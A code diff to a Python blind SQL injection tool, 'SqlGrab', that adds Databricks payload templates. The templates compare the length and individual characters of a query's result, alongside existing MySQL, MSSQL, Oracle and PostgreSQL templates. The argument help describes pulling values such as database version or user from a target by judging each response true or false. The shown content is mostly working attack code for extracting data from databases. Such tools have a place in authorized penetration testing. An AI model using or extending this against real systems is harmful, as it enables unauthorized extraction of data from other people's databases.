@@ -9,6 +9,7 @@ from io import BytesIO
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+#todo replace context passing with class properties and print function
 
 class HTTPRequest(BaseHTTPRequestHandler):
     ''' Used for parsing raw HTTP requests '''
@@ -46,6 +47,11 @@ class SqlGrab:
         'postgresql': {
             'length': 'LENGTH(({query})){operator}{value}',
             'character': 'SUBSTRING(({query}),{index},1){operator}CHR({value})',
+            'string': '({query})=\'{value}\''
+        },
+        'databricks': {
+            'length': 'length(({query})){operator}{value}',
+            'character': 'substr(({query}),{index},1){operator}CHR({value})',
             'string': '({query})=\'{value}\''
         },
     }
@@ -246,7 +252,7 @@ if __name__ == "__main__":
     parser.add_argument('-q', '--query', required=True,
                         help='SQL query to extract the response of. Must return a single string, e.g. @@version, SELECT user FROM dual')
     parser.add_argument('-d', '--dbms', required=True,
-                        choices=['mysql', 'mssql', 'oracle', 'postgresql'])
+                        choices=['mysql', 'mssql', 'oracle', 'postgresql', 'databricks'])
     parser.add_argument('-c', '--condition', required=True,
                         help='Python expression to evaluate to determine true/false from the response. E.g. \'"error" in response.text\', \'response.status_code == 401\', \'len(response.content) > 1433\'')
     parser.add_argument('--delay', required=False, default=0, type=float,
